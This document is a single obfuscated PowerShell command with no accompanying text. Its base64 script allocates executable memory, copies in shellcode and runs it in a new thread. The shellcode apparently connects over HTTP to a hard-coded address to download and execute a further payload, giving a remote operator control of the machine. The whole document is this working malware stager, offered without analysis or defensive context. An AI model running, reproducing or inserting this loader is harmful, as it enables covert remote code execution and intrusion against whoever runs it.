powershell -w 1 -C "sv ic -;sv bq ec;sv v ((gv ic).value.toString()+(gv bq).value.toString());powershell (gv v).value.toString() 'JABsAG0AIAA9ACAAJwAkAHMAUgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG0AcwB2AGMAcgB0AC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABtAGUAbQBzAGUAdAAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAAdQBpAG4AdAAgAHMAcgBjACwAIAB1AGkAbgB0ACAAYwBvAHUAbgB0ACkAOwAnACcAOwAkAG0AdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAUgAgAC0ATgBhAG0AZQAgACIAVwBpAG4AMwAyACIAIAAtAG4AYQBtAGUAcwBwAGEAYwBlACAAVwBpAG4AMwAyAEYAdQBuAGMAdABpAG8AbgBzACAALQBwAGEAcwBzAHQAaAByAHUAOwBbAEIAeQB0AGUAWwBdAF0AOwBbAEIAeQB0AGUAWwBdAF0AJABkAEYAIAA9ACAAMAB4AGYAYwAsADAAeABlADgALAAwAHgAOAAyACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4ADYAMAAsADAAeAA4ADkALAAwAHgAZQA1ACwAMAB4ADMAMQAsADAAeABjADAALAAwAHgANgA0ACwAMAB4ADgAYgAsADAAeAA1ADAALAAwAHgAMwAwACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMABjACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMQA0ACwAMAB4ADgAYgAsADAAeAA3ADIALAAwAHgAMgA4ACwAMAB4ADAAZgAsADAAeABiADcALAAwAHgANABhACwAMAB4ADIANgAsADAAeAAzADEALAAwAHgAZgBmACwAMAB4AGEAYwAsADAAeAAzAGMALAAwAHgANgAxACwAMAB4ADcAYwAsADAAeAAwADIALAAwAHgAMgBjACwAMAB4ADIAMAAsADAAeABjADEALAAwAHgAYwBmACwAMAB4ADAAZAAsADAAeAAwADEALAAwAHgAYwA3ACwAMAB4AGUAMgAsADAAeABmADIALAAwAHgANQAyACwAMAB4ADUANwAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEAMAAsADAAeAA4AGIALAAwAHgANABhACwAMAB4ADMAYwAsADAAeAA4AGIALAAwAHgANABjACwAMAB4ADEAMQAsADAAeAA3ADgALAAwAHgAZQAzACwAMAB4ADQAOAAsADAAeAAwADEALAAwAHgAZAAxACwAMAB4ADUAMQAsADAAeAA4AGIALAAwAHgANQA5ACwAMAB4ADIAMAAsADAAeAAwADEALAAwAHgAZAAzACwAMAB4ADgAYgAsADAAeAA0ADkALAAwAHgAMQA4ACwAMAB4AGUAMwAsADAAeAAzAGEALAAwAHgANAA5ACwAMAB4ADgAYgAsADAAeAAzADQALAAwAHgAOABiACwAMAB4ADAAMQAsADAAeABkADYALAAwAHgAMwAxACwAMAB4AGYAZgAsADAAeABhAGMALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeAAzADgALAAwAHgAZQAwACwAMAB4ADcANQAsADAAeABmADYALAAwAHgAMAAzACwAMAB4ADcAZAAsADAAeABmADgALAAwAHgAMwBiACwAMAB4ADcAZAAsADAAeAAyADQALAAwAHgANwA1ACwAMAB4AGUANAAsADAAeAA1ADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADQALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4ADAAYwAsADAAeAA0AGIALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAxAGMALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgAMAA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAAwACwAMAB4ADgAOQAsADAAeAA0ADQALAAwAHgAMgA0ACwAMAB4ADIANAAsADAAeAA1AGIALAAwAHgANQBiACwAMAB4ADYAMQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADUAMQAsADAAeABmAGYALAAwAHgAZQAwACwAMAB4ADUAZgAsADAAeAA1AGYALAAwAHgANQBhACwAMAB4ADgAYgAsADAAeAAxADIALAAwAHgAZQBiACwAMAB4ADgAZAAsADAAeAA1AGQALAAwAHgANgA4ACwAMAB4ADYAZQAsADAAeAA2ADUALAAwAHgANwA0ACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB4ADYAOQAsADAAeAA2AGUALAAwAHgANgA5ACwAMAB4ADUANAAsADAAeAA2ADgALAAwAHgANABjACwAMAB4ADcANwAsADAAeAAyADYALAAwAHgAMAA3ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAMwAxACwAMAB4AGQAYgAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADYAOAAsADAAeAAzAGEALAAwAHgANQA2ACwAMAB4ADcAOQAsADAAeABhADcALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADYAYQAsADAAeAAwADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA2ADgALAAwAHgAYgBiACwAMAB4ADAAMQAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4AGUAOAAsADAAeABiADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAMgBmACwAMAB4ADcANAAsADAAeAA0AGUALAAwAHgANQAyACwAMAB4ADUAMQAsADAAeAA2ADMALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeAAzADAALAAwAHgANQA2ACwAMAB4ADcANAAsADAAeAA3ADcALAAwAHgANgBhACwAMAB4ADYANgAsADAAeAA2ADkALAAwAHgANABhACwAMAB4ADUAZgAsADAAeAA2ADYALAAwAHgAMwAzACwAMAB4ADUAMwAsADAAeAAzADAALAAwAHgANwA5ACwAMAB4ADUAMQAsADAAeAA2ADQALAAwAHgANgA0ACwAMAB4ADcANAAsADAAeAA1AGYALAAwAHgANAA0ACwAMAB4ADUAZgAsADAAeAA1AGYALAAwAHgAMAAwACwAMAB4ADUAMAAsADAAeAA2ADgALAAwAHgANQA3ACwAMAB4ADgAOQAsADAAeAA5AGYALAAwAHgAYwA2ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA5ACwAMAB4AGMANgAsADAAeAA1ADMALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAzADIALAAwAHgAZQAwACwAMAB4ADgANAAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADcALAAwAHgANQAzACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgAZQBiACwAMAB4ADUANQAsADAAeAAyAGUALAAwAHgAMwBiACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQA2ACwAMAB4ADYAYQAsADAAeAAwAGEALAAwAHgANQBmACwAMAB4ADYAOAAsADAAeAA4ADAALAAwAHgAMwAzACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAOAA5ACwAMAB4AGUAMAAsADAAeAA2AGEALAAwAHgAMAA0ACwAMAB4ADUAMAAsADAAeAA2AGEALAAwAHgAMQBmACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgANwA1ACwAMAB4ADQANgAsADAAeAA5AGUALAAwAHgAOAA2ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgAMgBkACwAMAB4ADAANgAsADAAeAAxADgALAAwAHgANwBiACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADUALAAwAHgAMQA2ACwAMAB4ADYAOAAsADAAeAA4ADgALAAwAHgAMQAzACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgA4ACwAMAB4ADQANAAsADAAeABmADAALAAwAHgAMwA1ACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADQAZgAsADAAeAA3ADUALAAwAHgAYwBkACwAMAB4ADYAOAAsADAAeABmADAALAAwAHgAYgA1ACwAMAB4AGEAMgAsADAAeAA1ADYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA2AGEALAAwAHgANAAwACwAMAB4ADYAOAAsADAAeAAwADAALAAwAHgAMQAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANAAwACwAMAB4ADAAMAAsADAAeAA1ADMALAAwAHgANgA4ACwAMAB4ADUAOAAsADAAeABhADQALAAwAHgANQAzACwAMAB4AGUANQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADgAOQAsADAAeABlADcALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADAALAAwAHgAMgAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANQAzACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgAMQAyACwAMAB4ADkANgAsADAAeAA4ADkALAAwAHgAZQAyACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADQALAAwAHgAYwBkACwAMAB4ADgAYgAsADAAeAAwADcALAAwAHgAMAAxACwAMAB4AGMAMwAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANQAsADAAeABlADUALAAwAHgANQA4ACwAMAB4AGMAMwAsADAAeAA1AGYALAAwAHgAZQA4ACwAMAB4ADYAOQAsADAAeABmAGYALAAwAHgAZgBmACwAMAB4AGYAZgAsADAAeAAzADEALAAwAHgAMwA5ACwAMAB4ADMAMgAsADAAeAAyAGUALAAwAHgAMwAxACwAMAB4ADMANgAsADAAeAAzADgALAAwAHgAMgBlACwAMAB4ADMAMQAsADAAeAAyAGUALAAwAHgAMwA0ACwAMAB4ADAAMAA7ACQAQwBjACAAPQAgADAAeAAxADAAMAAwADsAaQBmACAAKAAkAGQARgAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABDAGMAIAA9ACAAJABkAEYALgBMAGUAbgBnAHQAaAB9ADsAJABaAFMAPQAkAG0AdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAEMAYwAsADAAeAA0ADAAKQA7AGYAbwByACAAKAAkAEcAQgA9ADAAOwAkAEcAQgAgAC0AbABlACAAKAAkAGQARgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABHAEIAKwArACkAIAB7ACQAbQB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAWgBTAC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAEcAQgApACwAIAAkAGQARgBbACQARwBCAF0ALAAgADEAKQB9ADsAJABtAHcAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAFoAUwAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAKQB7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQARAB3ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAGwAbQApACkAOwAkAGMAYQAgAD0AIAAiAC0AZQBjACAAIgA7AGkAZgAoAFsASQBuAHQAUAB0AHIAXQA6ADoAUwBpAHoAZQAgAC0AZQBxACAAOAApAHsAJABvAE8AIAA9ACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAIAArACAAIgBcAHMAeQBzAHcAbwB3ADYANABcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsACIAOwBpAGUAeAAgACIAJgAgACQAbwBPACAAJABjAGEAIAAkAEQAdwAiAH0AZQBsAHMAZQB7ADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABjAGEAIAAkAEQAdwAiADsAfQA='"